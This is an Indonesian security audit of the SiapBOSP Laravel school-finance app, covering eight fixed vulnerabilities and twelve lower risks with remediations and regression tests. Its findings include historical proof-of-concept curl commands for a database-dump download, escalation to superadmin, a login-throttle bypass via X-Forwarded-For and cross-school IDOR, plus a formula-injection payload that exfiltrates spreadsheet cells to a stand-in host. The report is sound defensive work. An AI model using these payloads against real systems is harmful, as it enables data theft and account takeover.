# Audit Keamanan SiapBOSP

| | |
|---|---|
| **Tanggal** | 24 Oktober 2026 |
| **Objek** | SiapBOSP (`amhyer/siapbosp`) — Laravel 13, PHP 8.3 |
| **Commit dasar** | `d048d2e` (`main`) |
| **Metode** | *Reverse engineering* statis: enumerasi rute → middleware → controller → model → view, analisis alur data (taint), pencarian sink berbahaya, pengujian isolasi multi-tenant, serta telaah mekanisme sesi/token/unggahan/ekspor |
| **Lingkup** | Kode aplikasi (bukan server, jaringan, atau ARKAS Desktop), tanpa pengujian aktif terhadap instalasi produksi |
| **Status saat ini** | K-01…K-08 dan R-04…R-11 telah diperbaiki pada kode; R-03 (handler atribut inline) sudah dimigrasi dan `script-src-attr` kini `'none'`; R-12 belum diuji terhadap SIEM produksi. Verifikasi perilaku antarmuka R-03 di browser sungguhan belum dijalankan pada lingkungan ini (lihat §5 butir 3) |

> Dokumen ini disusun untuk pemilik aplikasi. Jangan dijadikan panduan menyerang sistem milik pihak lain.

---

## 1. Ringkasan eksekutif

SiapBOSP adalah aplikasi multi-tenant: satu basis data menampung **seluruh sekolah** dalam satu Dinas. Bagian K-01…K-08 di bawah mendokumentasikan celah yang ditemukan sebelum perbaikan—bukan klaim bahwa celah tersebut masih aktif. Perubahan kode menambahkan kontrol unduhan backup, otorisasi target, filter tenant, hardening proxy, pencabutan sesi/token, perlindungan pagu, netralisasi formula, dan pemeriksaan kepemilikan HPP; uji regresi terkait tercantum pada tiap temuan.

**Status saat ini:** tidak ada bukti dari pembacaan kode ini bahwa klaim lama tentang IDOR HPP, spoofing `X-Forwarded-For`, akses sesi/token akun nonaktif, atau formula injection masih benar: `HppController::store`, `bootstrap/app.php`, middleware akun/token, dan helper ekspor telah memiliki kontrol terkait. Ini adalah verifikasi statis, bukan hasil uji penetrasi atau pengujian pada produksi. R-03 sudah ditutup pada kode: 80 handler atribut inline di 37 berkas Blade dipindah ke `data-*` + `addEventListener`, dan `script-src-attr` sekarang `'none'`; jalur remote R-12 tersedia, tetapi SIEM produksi belum dikonfigurasi/diverifikasi. Selain itu, workflow GitHub Actions untuk merge commit `7275f49` berakhir gagal pada langkah tes (exit code 2); log rinci tidak dapat diambil di lingkungan ini. Karena itu status keseluruhan belum boleh disebut lulus verifikasi rilis.

Matriks di bawah dan bagian §5 adalah ringkasan status terkini. Bukti eksploitasi dan akar masalah di §3 bersifat historis (sebelum patch); lihat subbagian **Perbaikan** serta uji regresi untuk kontrol yang diterapkan.

### Matriks temuan

| ID | Temuan | Tingkat | Komponen | Status |
|---|---|---|---|---|
| K-01 | Dump basis data penuh dapat diunduh akun sekolah | **Kritis** | `PengaturanController::backupUnduh`, `BackupService` | ✅ Diperbaiki |
| K-02 | Eskalasi hak akses `dinas` → `superadmin` | **Tinggi** | `DinasController::pengguna*` | ✅ Diperbaiki |
| K-03 | Kebocoran log aktivitas lintas sekolah | **Tinggi** | `PengaturanController::log`, `ArsipController` | ✅ Diperbaiki |
| K-04 | Pembatasan login dapat dilewati via `X-Forwarded-For` | **Sedang** | `bootstrap/app.php`, `LoginController` | ✅ Diperbaiki |
| K-05 | Akun/sekolah nonaktif tetap punya akses (token & sesi) | **Sedang** | `ApiTokenAuth`, `EnsureRole` | ✅ Diperbaiki |
| K-06 | Sekolah dapat menetapkan pagu BOSP sendiri | **Sedang** | `ProfilController::update` | ✅ Diperbaiki |
| K-07 | Formula/CSV Injection pada ekspor CSV & XLSX | **Sedang** | ekspor BKU, realisasi, konsolidasi, LPJ, RKAS | ✅ Diperbaiki |
| K-08 | Penulisan lintas sekolah lewat pemetaan HPP | **Sedang** | `HppController::store` | ✅ Diperbaiki |
| R-01 | Kebijakan sandi lemah (`min:6`, default `password`) | Rendah | `DinasController::pengguna*` | ✅ Kebijakan kuat + wajib ganti sandi diterapkan |
| R-02 | Token API tanpa kedaluwarsa & tanpa rotasi paksa | Rendah | `ApiTokenAuth`, Profil | ✅ Kedaluwarsa, pencabutan, dan rotasi diterapkan |
| R-03 | CSP tidak lengkap / inline script & handler | Rendah | respons web | ✅ CSP nonce + `script-src-attr 'none'`; tidak ada handler atribut inline yang tersisa (inventaris: `docs/R-03-INVENTARIS-HANDLER-INLINE.md`) |
| R-04 | Beban/DoS lewat unggahan besar & arsip XLSX/CSV | Rendah | impor ARKAS, rekonsiliasi, cek integritas, impor RKAS CSV | ✅ Semua pemrosesan impor/analisis ARKAS berat kini masuk antrean privat; worker wajib dioperasikan |
| R-05 | Pengumuman Dinas memicu email massal | Rendah | `DinasController::pengumumanStore` | ✅ Throttle, batas penerima aktif, email diantrekan pada queue async |
| R-06 | `APP_DEBUG=true` pada `.env.example` | Rendah | konfigurasi | ✅ Debug dinonaktifkan, konfigurasi berbahaya diperingatkan |
| R-07 | Tautan surel bergantung pada header `Host` | Rendah | `NotifMail`/`EmailNotif` | ✅ `TRUSTED_HOSTS` dikonfigurasi |
| R-08 | `sync_states` global tampil di arsip ekspor | Info | `ArsipController::ekspor` | ✅ Baris global hanya disertakan di aplikasi portabel |
| R-09 | Peran `dinas` dan `superadmin` nyaris setara | Info | `Peran`, Gate kemampuan | ✅ Gate diterapkan pada aksi sensitif |
| R-10 | Backup tidak dienkripsi / belum terjadwal | Info | `BackupService`, `BackupTerjadwalService` | ✅ Backup otomatis AES-256 (wajib password), harian, retensi |
| R-11 | `pg_dump` dipanggil lewat shell | Info | `DinasController::backup` | ✔️ Aman (argumen di-*escape*) |
| R-12 | Jejak audit belum dikirim ke syslog/SIEM | Info | `Aktivitas`, `config/logging.php` | ◐ File lokal + syslog host atau socket TLS JSON langsung tersedia; target produksi belum dihubungkan/diverifikasi |

---

## 2. Metodologi

1. **Pemetaan permukaan serangan** — enumerasi `routes/web.php` + `routes/api.php`, lalu penelusuran tiap rute ke middleware (`auth`, `role:*`, `auth.api`, CSRF) dan controller.
2. **Penelusuran alur data** — dari input (`$request->validate`, route binding, unggahan, parameter query) sampai sink (query DB, filesystem, respons unduhan, ekspor, email).
3. **Uji isolasi multi-tenant** — membandingkan pemakaian `BelongsToSchool` (global scope) vs `withoutGlobalScope()` vs `DB::table()` mentah, mencari query yang lupa `school_id`.
4. **Pencarian pola berbahaya** — `DB::raw/selectRaw/whereRaw`, `{!! !!}`, `innerHTML`, `shell_exec/exec/proc_open`, `Storage::`/`file_get_contents`, `->create($request…)`, `trustProxies`, header sesi.
5. **Analisis otorisasi per peran** — matriks `superadmin` / `dinas` / `operator` / `kepsek`, termasuk aksi yang menyentuh akun & data lintas sekolah.
6. **Telaah ekspor & antarmuka** — CSV/XLSX/PDF, nama berkas, isi pesan email, serta rendering Blade.
7. **Rujukan rute-controller** — tes regresi memeriksa setiap rute controller agar kelas dan method target tersedia.

**Verifikasi dan batasannya:** pemeriksaan statis terhadap `routes/web.php` dan `routes/api.php` menemukan 190 rujukan aksi controller eksplisit; semuanya cocok dengan kelas dan method yang ada. Parser statis `php-parser` (target PHP 8.4) memeriksa 192 berkas tanpa kesalahan sintaks; berkas tes baru juga telah dilint dengan PHP 8.5 WebAssembly. Suite berisi 57 metode `test_*` terkait kontrol keamanan/impor/error/rute (hitungan definisi, bukan hasil eksekusi). PHP native, Composer, dan `vendor/autoload.php` tidak tersedia lokal, sehingga `php artisan test` hanya dapat dijalankan di CI. Untuk putaran R-03, berkas PHP yang berubah dilint dengan PHP 8.5 WebAssembly (`php -l`) dan parser `php-parser`; perilaku JavaScript hasil migrasi diuji dengan jsdom (64 pemeriksaan: konfirmasi, autosubmit, cetak, sidebar/grup menu, tabel dinamis). Keduanya bukan pengganti suite PHPUnit maupun uji browser.

Run CI awal pada commit dasar dan dua run PR ([40168036167](https://github.com/amhyer/siapbosp/actions/runs/40168036167), [40169684683](https://github.com/amhyer/siapbosp/actions/runs/40169684683), [40169759044](https://github.com/amhyer/siapbosp/actions/runs/40169759044)) gagal pada langkah tes; seluruh setup PHP/Composer/Node/build/.env berhasil. Run 40170019600 yang tampak hijau **tidak valid** karena `tee` menyamarkan exit code PHPUnit; workflow kini memakai `shell: bash` + `pipefail`. Dengan status exit yang benar, run 40170157261 mengungkap 10 tes gagal dan 1 risky. Perbaikan mengoreksi asumsi tes yang usang: hash sesi saat test berganti aktor, nilai default `sumber` HPP, kebijakan bahwa impor sekolah di server pusat tidak menetapkan pagu resmi, lokasi ARKAS pada host non-Windows, serta hasil 403 untuk aksi Dinas yang tidak berwenang. Sesudah koreksi, run CI otoritatif [40170926506](https://github.com/amhyer/siapbosp/actions/runs/40170926506) lulus: **197 tes, 1.013 assertion**, tanpa tes risky, exit code 0. Workflow juga menerbitkan ringkasan hasil PHPUnit saat sukses, serta mengunggah log tes dan `storage/logs/laravel.log` sebagai artefak 7 hari dan menampilkan ringkasan tes gagal sebagai annotation; unduhan artefak dari sandbox tetap dibatasi jaringan. Workflow CI kini menjalankan suite lengkap pada SQLite dan PostgreSQL 16. Run [40171635280](https://github.com/amhyer/siapbosp/actions/runs/40171635280) meluluskan **197 tes dan 1.013 assertion pada masing-masing driver**. Staging tetap perlu memakai konfigurasi PHP/PostgreSQL yang sama dengan produksi untuk smoke test serta verifikasi data/operasional. Tidak ada pengujian DoS aktif, pemindaian port, atau pengujian terhadap domain produksi.

### Lingkungan serangan (hasil pemetaan)

| Lapisan | Isi |
|---|---|
| Publik tanpa sesi | `GET /login`, `POST /login` (throttle), `GET /up` (health), `GET /api/v1/ping`, aset statis `public/` (`pendamping-arkas.html`, `robots.txt`) |
| Berbasis sesi | `/dashboard`, `/rkas`, `/pembukuan/*`, `/laporan*`, `/pengaturan/*`, `/arsip/*`, `/utility/*` — grup `role:operator,kepsek` |
| Panel Dinas | `/dinas/*` — grup `role:superadmin,dinas` (melihat semua sekolah) |
| API Bearer | `/api/v1/{profil,tahap,saldo,transaksi,sync-referensi}`, `POST /arkas-push` + `GET /arkas-import/{id}` (status milik sendiri), `POST /sync-push` (`role:operator,kepsek`), `/dinas/*` (`role:superadmin,dinas`) |
| Isolasi tenant | Global scope `school` pada 9 model; binding rute memakai scope tersebut; `ActivityLog`, `Attachment`, `RkasDetail`, `KasTax`, `LpjSubmission` **tidak** memakai scope → wajib disaring manual |

---

## 3. Temuan detail

> **Penting:** subbagian K-01…K-08 berikut menerangkan kondisi historis sebelum patch. Jangan menafsirkan “Akar masalah”/“Dampak” sebagai temuan yang masih terbuka; periksa status saat ini di matriks, bagian “Perbaikan”, dan tes regresinya.

### K-01 — Unduhan dump basis data penuh oleh akun sekolah (Kritis)

**Lokasi.** `routes/web.php:221` (`/pengaturan/backup/unduh`, di dalam grup `role:operator,kepsek`), `app/Http/Controllers/PengaturanController.php:83`, `app/Services/BackupService.php:16`.

**Akar masalah.** Rute berada di panel sekolah, sedangkan `BackupService` menambahkan **berkas SQLite milik server** (`database/database.sqlite`) ke ZIP apa adanya. Pada instalasi pusat, berkas itu memuat **seluruh sekolah**: transaksi, RKAS, pajak, pengguna, `api_token` (hash SHA-256), dan hash kata sandi bcrypt. Tidak ada pemeriksaan peran.

**Bukti (sebelum perbaikan).**

```bash
# 1) login sebagai operator sekolah biasa (akun sah)
curl -c j.txt -b j.txt -X POST https://target/login \
     -d "_token=<csrf>&email=operator@sekolah.demo&password=password"

# 2) unduh dump penuh
curl -b j.txt -o bocor.zip https://target/pengaturan/backup/unduh
unzip -l bocor.zip            # -> database.sqlite
sqlite3 database.sqlite "select email, role, school_id, substr(password,1,7) from users;"
sqlite3 database.sqlite "select school_id, count(*) from kas_transactions group by 1;"
```

**Dampak.** Seluruh data keuangan Dinas bocor dari satu akun bendahara; hash bcrypt dapat dipecahkan luring (akun demo/lemah sangat mungkin), lalu penyerang masuk sebagai `superadmin` (lihat K-02). Ini setara kompromi total sistem.

**Perbaikan.**
- `PengaturanController::backupUnduh()` kini memanggil `bolehUnduhBackup()` → hanya `superadmin` **atau** aplikasi portabel (satu sekolah per laptop) yang boleh mengunduh.
- Tombol unduh disembunyikan di `resources/views/pengaturan/backup.blade.php` dan diganti penjelasan; pencadangan server tetap lewat panel Dinas.
- Penyamaran token pada `*.conf` diperkuat (`/^\s*TOKEN\s*=.*$/mi`), sehingga variasi `token = ...` ikut tersamarkan.
- Regresi: `test_akun_sekolah_tidak_bisa_mengunduh_dump_basis_data_penuh`, `test_hanya_superadmin_atau_mode_portabel_yang_boleh_mengunduh_backup`.

---

### K-02 — Eskalasi `dinas` → `superadmin` (Tinggi)

**Lokasi.** `routes/web.php:244-250`; `DinasController::penggunaUpdate/penggunaReset/penggunaToggle/penggunaHapus` (sebelum perbaikan tanpa pemeriksaan target).

**Akar masalah.** Semua rute `/dinas/pengguna/{user}` dapat diakses **kedua** peran (`role:superadmin,dinas`) dan tidak memeriksa **peran objek**. Route model binding `User` juga tidak dibatasi. Akibatnya akun `dinas` dapat:

- mengganti `email` akun `superadmin` menjadi alamat yang ia kendalikan,
- `POST /dinas/pengguna/{superadmin}/reset` → sandi acak ditampilkan di respons & dikirim ke email baru tadi,
- masuk sebagai `superadmin`; atau langsung `DELETE` akun `superadmin` (satu-satunya penjaga hanya "jumlah akun dinas/admin ≤ 1").

**Bukti (sebelum perbaikan).**

```bash
# login sebagai dinas (bukan superadmin)
curl -c d.txt -b d.txt -X POST https://target/login -d "_token=..&email=dinas@siapbosp.id&password=.."

# ambil alih akun superadmin
curl -b d.txt -X PUT  https://target/dinas/pengguna/1 \
     -d "_method=PUT&name=Owner&email=penyerang@jahat.test&role=dinas"
curl -b d.txt -X POST https://target/dinas/pengguna/1/reset -d "_token=.."
# respons memuat sandi baru  -> login sebagai superadmin
```

**Perbaikan.** Helper `pastikanBolehKelola(User $target)` (`DinasController.php:651`) menolak (403) bila target berperan `superadmin` dan aktor bukan `superadmin`; dipanggil pada keempat aksi. Jalur **impor CSV** (`penggunaImpor`) juga ditutup: baris berperan `superadmin` kini ditolak kecuali aktornya `superadmin` sendiri (sebelumnya satu berkas CSV dapat mencetak akun `superadmin` baru tanpa lewat `pastikanBolehKelola`). Regresi: `test_dinas_tidak_bisa_mereset_sandi_superadmin`, `test_dinas_tidak_bisa_mengubah_email_atau_menghapus_superadmin`, `test_impor_pengguna_tidak_bisa_dipakai_eskalasi_ke_superadmin`.

> Catatan pengerasan lanjutan: idealnya `superadmin` diberi izin khusus (lihat R-09) dan aksi sensitif memakai konfirmasi ulang sandi.

---

### K-03 — Kebocoran log aktivitas lintas sekolah (Tinggi)

**Lokasi.** `PengaturanController::log()` (sebelumnya `ActivityLog::with('user')…` tanpa filter), `ArsipController::impor()`/`ekspor()`, model `ActivityLog` (tanpa global scope).

**Akar masalah.** `ActivityLog` sengaja tidak memakai `BelongsToSchool` (karena juga dipakai untuk peristiwa login tanpa sekolah), tetapi tiga halaman sekolah lupa menambahkan `where('school_id', …)`. Keterangan log yang bocor memuat uraian transaksi, nominal rupiah, status RKAS, dan nama sekolah lain; `daftarAksi` pun menampilkan aksi milik sekolah lain.

**Bukti (sebelum perbaikan).**

```bash
curl -b opA.txt https://target/pengaturan/log          # memuat "Belanja Rp … — <keterangan sekolah B>"
curl -b opA.txt https://target/arsip/ekspor            # riwayat ekspor semua sekolah
```

**Dampak.** Kebocoran informasi keuangan antar sekolah (melanggar prinsip *need to know* dan asas kerahasiaan data BOSP), serta memudahkan penyerang memetakan aktivitas sekolah lain sebelum menyerang.

**Perbaikan.** Semua query di tiga metode kini difilter `school_id` pengguna (termasuk daftar opsi filter). Regresi: `test_log_sistem_hanya_menampilkan_aktivitas_sekolah_sendiri`, `test_riwayat_impor_dan_ekspor_tidak_membocorkan_sekolah_lain`.

---

### K-04 — Pembatasan login dapat dilewati dengan `X-Forwarded-For` (Sedang)

**Lokasi sebelum patch.** `bootstrap/app.php` (`$middleware->trustProxies(at: '*')`), `LoginController::login` (kunci throttle = `email|ip`, IP dari `$request->ip()`). **Kode saat ini** mempercayai hanya daftar eksplisit `TRUSTED_PROXIES` (kosong berarti tidak ada proxy tepercaya) dan memiliki limiter per-IP tambahan; lihat `bootstrap/app.php` serta `AppServiceProvider::pasangPembatasLaju()`. Konfigurasi IP proxy produksi tetap perlu diuji dari jaringan deployment.

**Akar masalah.** Karena **semua** alamat dipercaya sebagai proxy, nilai `X-Forwarded-For` yang dikirim klien langsung dipakai sebagai IP. Kunci throttle berubah setiap permintaan → blokir 5×/5 menit tidak pernah tercapai. Efek samping: jejak audit `auth-*` juga menyimpan IP palsu, sehingga halaman **Pusat Keamanan** menyesatkan.

**Bukti (sebelum perbaikan).**

```bash
for i in $(seq 1 200); do
  curl -s -H "X-Forwarded-For: 203.0.113.$i" -X POST https://target/login \
       -d "_token=<csrf>&email=dinas@siapbosp.id&password=tebakan$i" > /dev/null
done    # tidak pernah muncul "Terlalu banyak percobaan"
```

**Perbaikan.**
- `TRUSTED_PROXIES` di `.env.example`; middleware hanya mempercayai daftar eksplisit (kosong = tidak ada proxy).
- Ditambah pembatas **per-IP**: maksimum 25 kegagalan / 5 menit (`LoginController.php:24-30,41`) untuk menahan *password spraying* lintas banyak email dari satu sumber.
- Regresi tidak khusus (sulit diuji tanpa proxy nyata) → **wajib diverifikasi manual** di server yang memakai Nginx/Cloudflare dengan `TRUSTED_PROXIES` terisi.

> **Tindakan deployment:** bila memakai reverse proxy/CDN, isi `TRUSTED_PROXIES` dengan IP proxy tersebut. Bila tidak, biarkan kosong (perilaku aman).

---

### K-05 — Akun/sekolah nonaktif tetap memiliki akses (Sedang)

**Lokasi.** `LoginController::login` (hanya memeriksa saat login), `ApiTokenAuth`, `EnsureRole`.

**Akar masalah.** Penonaktifan akun oleh Dinas (`is_active=false`) hanya dievaluasi pada saat login. Sesi yang sudah berjalan tetap sah sampai kedaluwarsa, dan **token API tidak pernah dicabut** — token akun yang dinonaktifkan tetap dapat membaca `/api/v1/transaksi`, `/saldo`, bahkan `POST /sync-push`. Hal yang sama berlaku ketika **sekolah** dinonaktifkan.

**Bukti (sebelum perbaikan).**

```bash
# akun sudah dinonaktifkan Dinas, tetapi token lama masih hidup:
curl -H "Authorization: Bearer <token-akun-nonaktif>" https://target/api/v1/saldo   # 200
```

**Dampak.** Pencabutan akses tidak efektif (mis. akun bendahara bermasalah tetap bisa menarik data / mengirim data ke pusat).

**Perbaikan.** `ApiTokenAuth` menolak (403 JSON) bila `is_active=false` atau sekolah nonaktif; `EnsureRole` memutus sesi (logout, invalidasi, regenerasi token) dan mengarahkan ke halaman login dengan pesan; respons JSON tetap JSON.

Pemeriksaan lewat `EnsureRole` saja **belum cukup**: rute yang hanya memakai middleware `auth` (mis. `/referensi`, `POST /api-token`, `/ganti-password`, `/sesi/tahun`, `/notifikasi/*`) tidak pernah melewatinya, sehingga akun yang baru dinonaktifkan masih dapat memutar token API baru atau membaca referensi. Karena itu ditambahkan middleware global-grup `PastikanAkunAktif` (didaftarkan di `bootstrap/app.php` lewat `$middleware->web(append: …)`) yang memutus semua sesi bersesi sebelum middleware rute berjalan.

Pencabutan akses juga dituntaskan pada dua jalur lain yang sebelumnya tidak menyentuh sesi/token lama:

- **Sesi diikat ke hash sandi.** `LoginController` menyimpan `password_hash_web` di sesi; `PastikanAkunAktif` membandingkannya (`hash_equals`) dengan hash di basis data pada setiap permintaan. Begitu Dinas mereset sandi — atau pengguna mengganti sandinya — **semua sesi lama langsung mati**, termasuk milik penyerang yang sebelumnya memegang sesi korban.
- **Token API dicabut dan `remember_token` diputar** saat akun dinonaktifkan (`penggunaToggle`), sandi direset (`penggunaReset`), dan saat pengguna mengganti sandinya sendiri (`ProfilController::updatePassword`). Rotasi `remember_token` mematikan cookie "ingat saya" lama — tanpa itu, cookie tersebut dapat memulihkan sesi walau sandi sudah direset. Pemeriksaan `is_active` tetap ada sebagai lapis kedua.

Regresi: `test_token_api_akun_nonaktif_ditolak`, `test_token_api_sekolah_nonaktif_ditolak`, `test_sesi_akun_yang_dinonaktifkan_langsung_diputus`, `test_rute_auth_saja_ikut_diputus_saat_akun_dinonaktifkan`, `test_sekolah_nonaktif_memutus_semua_sesi_penggunanya`, `test_reset_sandi_oleh_dinas_mematikan_sesi_lama`, `test_menonaktifkan_akun_mencabut_token_api`.

---

### K-06 — Sekolah dapat menetapkan pagu BOSP sendiri (Sedang)

**Lokasi.** `routes/web.php:192` (`PUT /utility/profil`), `ProfilController::update` — parameter `sinkron_pagu`.

**Akar masalah.** Operator/kepsek dapat mengisi `jumlah_siswa` & `satuan_biaya_bosp` (memang data sekolah), tetapi dengan `sinkron_pagu=1` server langsung menulis **`allocations.nilai`** (pagu resmi) untuk sekolah tersebut tanpa persetujuan Dinas. Angka pagu dipakai untuk seluruh perhitungan serapan, grafik konsolidasi, dan laporan LPJ.

**Bukti (sebelum perbaikan).**

```bash
curl -b opA.txt -X PUT https://target/utility/profil \
  -d "_method=PUT&nama=SD+Negeri+A&jenjang=SD&jumlah_siswa=5000&satuan_biaya_bosp=9000000&sinkron_pagu=1&_token=.."
# allocations.nilai naik menjadi 45 miliar; dashboard Dinas ikut berubah
```

**Dampak.** Manipulasi pagu & indikator kinerja (integritas laporan keuangan), dapat menutupi penyimpangan realisasi.

**Perbaikan.** Penulisan `allocations` hanya untuk `superadmin`/`dinas` (`ProfilController::bolehSinkronPagu()`, plus `UnduhAplikasiController::isPortable()` untuk instalasi satu sekolah); sekolah tetap boleh memperbarui data Dapodik (`jumlah_siswa`, `satuan_biaya_bosp`) sebagai self-report, tetapi sinkron pagu diabaikan dan diberi pesan. Setiap perubahan parameter dasar pagu dicatat ke jejak audit (`Aktivitas::catat('profil'|'pagu', …)`).

**Celah lanjutan yang ikut ditutup.** `JuknisBosp2026Service::paguSumberDana()` memakai `jumlah_siswa × satuan_biaya_bosp` sebagai *fallback* ketika Dinas belum mengisi alokasi — dan *fallback* itu dipakai juga di **halaman tinjauan/pengesahan RKAS milik Dinas**, sehingga sekolah cukup membesarkan angka Dapodik untuk memperbesar pagu yang dilihat peninjau. Kini fungsi menerima `$pakaiEstimasi` (default `true` untuk halaman sekolah) dan `rkas/show.blade.php` memanggilnya dengan `false` pada mode tinjauan Dinas: Dinas hanya melihat pagu dari alokasi resmi. **Jalur ketiga: impor berkas ARKAS.** `ArkasImportService::imporPelengkap()` membuat baris `allocations` dari *sheet* `Anggaran` pada berkas XLSX yang **diunggah sekolah** (`POST /api/v1/arkas-push`, `/impor-arkas`), sehingga pagu resmi tetap bisa diisi sekolah lewat jalur ini. Kini pengisian otomatis hanya dilakukan bila aktornya Dinas/superadmin atau aplikasi portabel (`ArkasImportService::bolehTetapkanPagu()`); selain itu angkanya hanya dilaporkan sebagai selisih ("belum dipakai sebagai pagu — pagu resmi ditetapkan Dinas").

Regresi: `test_sekolah_tidak_bisa_menulis_pagu_lewat_profil`, `test_tinjauan_dinas_tidak_memakai_estimasi_pagu_isi_sekolah`, `test_impor_arkas_sekolah_tidak_boleh_menetapkan_pagu_resmi`.

---

### K-07 — Formula / CSV Injection pada ekspor (Sedang)

**Lokasi.** `PembukuanController::bkuCsv`, `LaporanArkasController::realisasiCsv`, `DinasController::konsolidasiCsv`, `LaporanController::lpjZip` & `pajakTriwulan`, serta `LpjExportService`, `RkasExportService`, `KonsolidasiExportService` (XLSX).

**Akar masalah.** `fputcsv()` maupun `PhpSpreadsheet::fromArray()/setCellValue()` meneruskan string apa adanya. Sel yang diawali `=`, `+`, `-`, `@`, TAB, atau CR dieksekusi Excel/LibreOffice. Nilai berasal dari pengguna: `keterangan` transaksi, `uraian` belanja, `no_rkas`, bahkan **nama sekolah** yang diisi lewat Profil.

**Bukti (sebelum perbaikan).**

```bash
# operator membuat transaksi dengan keterangan:
#   =HYPERLINK("http://jahat.test/?d="&A1,"Klik untuk verifikasi")
curl -b opA.txt "https://target/pembukuan/bku.csv?bulan=2026-10" -o bku.csv     # sel mentah
curl -b dinas.txt "https://target/konsolidasi.csv" -o konsol.csv                # nama sekolah ikut
# Dinas membuka file di Excel -> formula berjalan (mis. exfiltration sel / tautan phishing)
```

**Dampak.** Eksekusi formula di komputer Dinas (pencurian isi sel, tautan phishing berlabel resmi, potensi *remote data exfiltration* lewat `WEBSERVICE`/`HYPERLINK`). Rentan karena berkas justru dibuat untuk dibuka di Excel.

**Perbaikan.** Helper baru `App\Support\Csv` (`sel()`/`baris()`) menambahkan prefix `'` pada sel teks berkarakter pembuka formula, diterapkan pada seluruh jalur ekspor di atas (CSV BKU, realisasi, konsolidasi, paket LPJ, rekap pajak, LPJ/RKAS/Konsolidasi XLSX).

Verifikasi ulang menemukan tiga sel XLSX yang masih lolos: identitas sekolah pada ringkasan LPJ (`LpjExportService:124`, kolom B — nama/alamat/kecamatan diisi lewat Profil), label komponen pada rincian RKAS (`RkasExportService:85` dan `:97`, berasal dari kolom `komponen` master rekening yang dapat diimpor), ketiganya kini melewati `Csv::sel()`. Judul kop konsolidasi dan header rekap pajak triwulan juga ikut dinetralkan agar tidak ada satu pun jalur `fputcsv()`/`setCellValue()` yang meneruskan teks mentah (diverifikasi dengan `grep` menyeluruh: tidak ada pemanggilan tanpa `Csv`).

**Nama berkas unduhan** juga dibersihkan: `LpjExportService::namaBerkas()` sebelumnya menyisipkan nama tahap (`stages.nama`, diisi Dinas) apa adanya dan `UnduhAplikasiController` memakai `schools.npsn` mentah — keduanya bisa memuat tanda kutip/CR-LF yang menyusup ke header `Content-Disposition`. Kini keduanya di-`Str::slug()`/`preg_replace()`.

Regresi: `test_ekspor_bku_menetralkan_formula_csv_injection`, `test_nama_berkas_ekspor_tidak_bisa_disusupi_baris_baru`, `tests/Unit/CsvTest.php`.

> Catatan: untuk XLSX nilai berawalan `'` tampil apa adanya (hanya terjadi pada data yang memang menyerupai formula), alternatif jangka panjang adalah `setCellValueExplicit(..., DataType::TYPE_STRING)`.

---

### K-08 — IDOR tulis lintas sekolah pada pemetaan HPP (Sedang)

**Lokasi.** `routes/web.php` (`POST /hpp`), `HppController::store`.

**Akar masalah.** `KasDetail` dan `RkasDetail` sengaja tidak memakai global scope (dipakai juga oleh proses impor tanpa sesi). `store()` memakai `KasDetail::find($id)` langsung dari kunci array yang dikirim klien, lalu `update()`. Validasi `exists:rkas_details,id` juga tidak membatasi sekolah. Penyerang cukup menebak/mengiterasi id.

**Bukti (sebelum perbaikan).**

```bash
# operator sekolah A; id 12345 = rincian belanja milik sekolah B
curl -b opA.txt -X POST https://target/hpp   -d "_token=..&peta[12345][rkas_detail_id]=777&peta[12345][sumber]=siplah"
# rincian belanja sekolah B berubah (terhubung ke RKAS & sumber dana lain)
```

**Dampak.** Integritas data lintas sekolah: rincian belanja korban dapat dipetakan ulang ke RKAS/sumber dana lain, merusak rekap realisasi, laporan HPP, dan audit. Tidak ada kebocoran baca lewat endpoint ini, tetapi efek tulisnya nyata.

**Perbaikan.** Setiap baris diverifikasi kepemilikannya melalui relasi `transaksi.school_id`; `rkas_detail_id` hanya diterima bila rincian RKAS itu milik sekolah yang sama (`RkasDetail → header → school_id`). Baris yang ditolak dihitung dan dilaporkan. Regresi: `test_tidak_bisa_memetakan_rincian_belanja_sekolah_lain_lewat_hpp`.

---

## 4. Hasil yang *tidak* rentan (verifikasi negatif)

| Kelas kerentanan | Hasil | Bukti / alasan |
|---|---|---|
| SQL Injection | **Tidak ditemukan** | Seluruh `DB::raw/whereRaw/selectRaw` memakai string statis; input selalu *bound* (`?`) atau integer-cast; `ilike` pada `/dinas/keamanan` memakai binding |
| XSS tersimpan | **Tidak ditemukan** | Blade meng-*escape* default; 6 pemakaian `{!! !!}` hanya berisi HTML statis atau `nl2br(e(...))`; JavaScript memakai `textContent` |
| IDOR lintas sekolah | **Tidak ditemukan** (setelah perbaikan K-03) | `KasTransaction`, `RkasHeader`, `Penandatangan` memakai global scope; `Attachment` diverifikasi lewat `transaksi->school_id`; `RkasController::sisipUraian`/`toggleInputArkas` memverifikasi `rkas_header_id`; `StandarHarga::destroy` menolak master global |
| Mass assignment | **Tidak ditemukan** | Semua penulisan memakai array hasil `validate()`; `$guarded = []` pada model tidak terekspos ke input mentah |
| Path traversal / arbitrary write | **Tidak ditemukan** | Unggahan memakai `UploadedFile::store()` (nama di-*hash*), lampiran & TTD disimpan privat, unduhan lewat controller + pemeriksaan pemilik; `basename()` + regex pada sinkronisasi lampiran |
| Upload berbahaya | **Baik** | `mimes:pdf,jpg,jpeg,png`, batas ukuran, `image`+`mimes` untuk TTD, GD re-encode (`TtdGambar`) |
| Shell injection | **Tidak ditemukan** | `pg_dump` memakai `escapeshellarg` untuk semua argumen; `proc_open` pada `TarikArkasService` memakai argumen array |
| CSRF | **Baik** | Middleware default aktif; tidak ada pengecualian di `bootstrap/app.php` |
| Token API | **Baik** | Disimpan sebagai SHA-256, hanya header `Authorization`, rotasi saat unduh identitas, tidak lagi via query string |
| Rahasia di repo | **Bersih** | `launcher-windows/*.conf` berisi `TOKEN=` kosong; `.env` di-*ignore* |
| Session fixation | **Baik** | `session()->regenerate()` setelah login; `invalidate()` + `regenerateToken()` saat logout |

---

## 5. Sisa risiko & rekomendasi lanjutan — status R-01 … R-12

Semua butir di bawah **sudah dikerjakan** pada putaran ini; yang tersisa adalah
pekerjaan yang memang butuh perubahan arsitektur/infrastruktur, ditandai ◐.

1. **R-01 Kebijakan sandi — ✅ selesai.** `App\Support\Sandi` + `App\Rules\SandiKuat`: minimal 10 karakter, wajib huruf & angka, menolak daftar sandi umum, menolak sandi yang memuat nama/email. Diterapkan pada pembuatan akun, reset sandi Dinas, ganti sandi mandiri, dan impor CSV (yang sebelumnya memberi sandi bawaan `password` — sekarang sandi acak kuat dan **semua** akun hasil impor/admin wajib mengganti sandi saat login pertama lewat kolom `must_change_password`, dipaksa middleware `PastikanAkunAktif`). Sandi acak hasil reset hanya ditampilkan di layar bila `MAIL_MAILER=log` (demo); di produksi cukup lewat email.
